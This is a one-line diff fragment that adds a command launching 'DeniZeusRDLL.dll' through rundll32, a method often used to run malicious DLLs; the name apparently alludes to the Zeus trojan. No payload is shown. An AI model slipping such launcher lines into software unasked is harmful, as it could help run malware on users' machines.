@@ -1,0 +1,1 @@
+start rundll32 DeniZeusRDLL.dll,start
